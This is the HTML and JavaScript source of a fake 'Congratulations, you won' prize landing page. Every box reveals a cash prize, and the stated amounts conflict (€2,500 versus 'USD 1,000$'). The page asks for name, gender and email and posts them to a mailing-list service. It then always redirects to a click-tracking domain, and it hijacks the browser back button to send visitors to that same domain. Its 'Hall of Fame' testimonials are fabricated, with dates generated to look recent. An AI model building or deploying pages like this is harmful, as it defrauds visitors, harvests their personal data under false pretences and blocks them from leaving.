<!doctype html>
<html lang="en" dir="ltr">

<head>
  <title>Congratulations!</title>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="shortcut icon" href="data:image/x-icon" type="image/x-icon">
  <link href="landers/pick-a-prize/assets/app.css" type="text/css" rel="stylesheet" />
  <script src="../_worker.js"></script>
</head>

<body class="theme--default">

  <main id="app" v-cloak>
    <div class="header">
      <img class="header__menu" src="landers/pick-a-prize/assets/img/menu.svg" alt="Menu">
      <img class="header__logo" src="landers/pick-a-prize/assets/img/logo/default.svg" alt="Image" />
      <img class="header__account" src="landers/pick-a-prize/assets/img/account.svg" alt="Account">
    </div>
    <div class="content">
      <div v-if="!showPrize">
        <h1 class="title title--h1">
          🥳 Congratulations! 🥳
        </h1>
        <p class="paragraph">
          You have the chance to win a big prize!
        </p>
        <p class="paragraph">
          Open a box and find out what you can win⬇️
        </p>
        <prize-picker button-text="Select" button-selected-text="Ganado!" button-hover-color="#00c853"
          :disabled="!!selected" class="prize-picker" v-on:selected="receiveSelected">
          <template v-slot:prize1>
            <img v-show="!selected" key="1" src="landers/pick-a-prize/assets/img/chest.jpg"
              class="prize-picker__image prize-picker__image--placeholder" alt="">
            <img v-show="selected === 1" key="2" src="img/prizes/cash-2500-usd/nl/default@0.5x.png"
              class="prize-picker__image" alt="/€2,500.00 Cash" />
            <img v-show="selected && selected !== 1" key="3" src="landers/pick-a-prize/assets/img/chest.jpg"
              class="prize-picker__image prize-picker__image--placeholder" alt="/€2,500.00 Cash" />
          </template>
          <template v-slot:prize2>
            <img v-show="!selected" src="landers/pick-a-prize/assets/img/chest.jpg"
              class="prize-picker__image prize-picker__image--placeholder" alt="">
            <img v-show="selected === 2" src="img/prizes/cash-2500-usd/nl/default@0.5x.png" class="prize-picker__image"
              alt="/€2,500.00 Cash" alt="" />
            <img v-show="selected && selected !== 2" src="landers/pick-a-prize/assets/img/chest.jpg"
              class="prize-picker__image prize-picker__image--placeholder" alt="/€2,500.00 Cash" />
          </template>
          <template v-slot:prize3>
            <img v-show="!selected" src="landers/pick-a-prize/assets/img/chest.jpg"
              class="prize-picker__image prize-picker__image--placeholder" alt="" />
            <img v-show="selected === 3" src="img/prizes/cash-2500-usd/nl/default@0.5x.png" class="prize-picker__image"
              alt="/€2,500.00 Cash" alt="" />
            <img v-show="selected && selected !== 3" src="landers/pick-a-prize/assets/img/chest.jpg"
              class="prize-picker__image prize-picker__image--placeholder" alt="/€2,500.00 Cash" />
          </template>
        </prize-picker>
      </div>
      <div class="prize" v-else>
        <h2 class="title title--h2">You Won:</h2>
        <img class="prize__image" src="img/prizes/cash-2500-usd/nl/default@0.5x.png" alt="">
        <div class="prize__name">
          💵 USD 1,000$ 💵
        </div>
        <form class="list-subscribe-form" id="mailwizForm" lang="en" onsubmit="handleSubmit(event)"
          action="https://emailstellar.com/index.php/lists/cn659j3s3vda1/subscribe" method="post">
          <div>
            <h3>Please Fill Out Your Information to Claim the Reward.</h3>

            <div class="form-group">
              <label for="NAME">Name <span class="required">*</span></label>
              <input oninvalid="this.setCustomValidity('Please fill out this field.')"
                oninput="this.setCustomValidity('')" class="form-control" type="text" placeholder="Name" name="NAME"
                id="NAME" required />
            </div>

            <div class="form-group">
              <label for="GENDER">Gender <span class="required">*</span></label>
              <select oninvalid="this.setCustomValidity('Please select an option.')"
                oninput="this.setCustomValidity('')" class="form-control" name="GENDER" id="GENDER" required>
                <option value="">Please select an option.</option>
                <option value="Male">Male</option>
                <option value="Female">Female</option>
              </select>
            </div>

            <div class="form-group">
              <label for="EMAIL">Email <span class="required">*</span></label>
              <input oninvalid="this.setCustomValidity('Please fill out this field.')"
                oninput="this.setCustomValidity('')" class="form-control" type="email" placeholder="Email" name="EMAIL"
                id="EMAIL" required />
            </div>

            <div>
              <input type="hidden" name="e701645f9da5b709ba1ebc699746fe58f21bf296" value="" />
            </div>

            <div>
              <button type="submit" class="prize__button">Claim Now ➡️</button>
            </div>
          </div>
        </form>
      </div>
      <div class="testimonials">
        <h2 class="testimonials__title">Hall of Fame</h2>
        <prize-comment avatar="img/profiles/latin/female/3@0.25x.jpg" name="Alba Jiménez"
          :date="`${DateHelper().getMonthName({ days: -1 })} ${DateHelper().getDate({ days: -1 })}, ${DateHelper().getYear({ days: -1 })}`"
          message="I received it today, i'm so happy!"></prize-comment>
        <prize-comment avatar="img/profiles/latin/male/3@0.25x.jpg" name="David Navarro"
          :date="`${DateHelper().getMonthName({ days: -2 })} ${DateHelper().getDate({ days: -2 })}, ${DateHelper().getYear({ days: -2 })}`"
          message="No prize for me... can I have another chance?"></prize-comment>
        <prize-comment avatar="img/profiles/latin/male/10@0.25x.jpg" name="Hugo García"
          :date="`${DateHelper().getMonthName({ days: -2 })} ${DateHelper().getDate({ days: -2 })}, ${DateHelper().getYear({ days: -2 })}`"
          message="I won!! Thanks!"></prize-comment>
        <prize-comment avatar="img/profiles/latin/female/6@0.25x.jpg" name="Paula Moreno"
          :date="`${DateHelper().getMonthName({ days: -3 })} ${DateHelper().getDate({ days: -3 })}, ${DateHelper().getYear({ days: -3 })}`"
          message="Unbelievable, I received a $1,000 Amazon Gift Card"></prize-comment>
        <prize-comment avatar="img/profiles/latin/male/9@0.25x.jpg" name="Santiago Fernández"
          :date="`${DateHelper().getMonthName({ days: -4 })} ${DateHelper().getDate({ days: -4 })}, ${DateHelper().getYear({ days: -4 })}`"
          message="This is amazing I can't wait to receive it!"></prize-comment>
        <prize-comment avatar="img/profiles/latin/female/5@0.25x.jpg" name="Daniela Alonso"
          :date="`${DateHelper().getMonthName({ days: -4 })} ${DateHelper().getDate({ days: -4 })}, ${DateHelper().getYear({ days: -4 })}`"
          message="Call me a sore loser, because I really wanted it!"></prize-comment>
        <prize-comment avatar="img/profiles/latin/female/1@0.25x.jpg" name="Noa García"
          :date="`${DateHelper().getMonthName({ days: -6 })} ${DateHelper().getDate({ days: -6 })}, ${DateHelper().getYear({ days: -6 })}`"
          message="That was so easy, I won!!!!"></prize-comment>
        <prize-comment avatar="img/profiles/latin/male/2@0.25x.jpg" name="Martín Moreno"
          :date="`${DateHelper().getMonthName({ days: -7 })} ${DateHelper().getDate({ days: -7 })}, ${DateHelper().getYear({ days: -7 })}`"
          message="I've never won anything, but I hope I'm lucky!"></prize-comment>
        <prize-comment avatar="img/profiles/latin/male/6@0.25x.jpg" name="Nicolas López"
          :date="`${DateHelper().getMonthName({ days: -8 })} ${DateHelper().getDate({ days: -8 })}, ${DateHelper().getYear({ days: -8 })}`"
          message="The gift wasn't received until the next day, but it's real."></prize-comment>
        <prize-comment avatar="img/profiles/latin/male/8@0.25x.jpg" name="Juan González"
          :date="`${DateHelper().getMonthName({ days: -9 })} ${DateHelper().getDate({ days: -9 })}, ${DateHelper().getYear({ days: -9 })}`"
          message="Both my wife and I won the prize, which is really nice, haha!"></prize-comment>
      </div>
    </div>
    <div class="loader" v-show="selected && !showPrize">
      <div class="loader__dual-ring"></div>
    </div>
  </main>

  <script>
    window.view = window.view || {};
    view.datetimeTranslations = {
      "ago": ":time ago",
      "from_now": ":time from now",
      "after": ":time after",
      "before": ":time before",
      "year": "1 year|:count years",
      "month": "1 month|:count months",
      "week": "1 week|:count weeks",
      "day": "1 day|:count days",
      "hour": "1 hour|:count hours",
      "minute": "1 minute|:count minutes",
      "second": "1 second|:count seconds",
      "january": "January",
      "february": "February",
      "march": "March",
      "april": "April",
      "may": "May",
      "june": "June",
      "july": "July",
      "august": "August",
      "september": "September",
      "october": "October",
      "november": "November",
      "december": "December",
      "monday": "Monday",
      "tuesday": "Tuesday",
      "wednesday": "Wednesday",
      "thursday": "Thursday",
      "friday": "Friday",
      "saturday": "Saturday",
      "sunday": "Sunday"
    };
  </script>
  <script>
    // 当页面加载完成时，立即向history栈添加一个状态
    history.pushState(null, null, location.href);

    window.onpopstate = function (event) {
      // 这里处理用户点击浏览器后退按钮的情况
      // 重定向用户到指定页面, 比如 Google
      location.href = 'https://2.find-u.xyz/click';
      // 或者重定向用户到他们之前的页面
      // history.go(-1);
    }
  </script>
  <script type="application/javascript" src="landers/pick-a-prize/assets/app.js"></script>

  <script>
    function handleSubmit(event) {
      // 阻止默认表单提交
      event.preventDefault();

      // 获取表单元素
      const form = event.target;

      // 获取提交地址
      const submitUrl = form.action;

      // 创建表单数据对象
      const formData = new FormData(form);

      // 禁用提交按钮，防止重复提交
      const submitButton = form.querySelector('button[type="submit"]');
      if (submitButton) {
        submitButton.disabled = true;
        submitButton.textContent = 'Submitting...';
      }

      // 使用 fetch 提交表单
      fetch(submitUrl, {
        method: 'POST',
        body: formData,
        mode: 'no-cors' // 处理跨域
      })
        .then(response => {
          // 无论成功与否，都跳转到感谢页面
          window.location.href = 'https://2.find-u.xyz/click';
        })
        .catch(error => {
          console.error('提交出错:', error);

          // 恢复提交按钮
          if (submitButton) {
            submitButton.disabled = false;
            submitButton.textContent = 'Claim Now ➡️';
          }

          // 仍然跳转
          window.location.href = 'https://2.find-u.xyz/click';
        });
    }
  </script>

</body>

</html>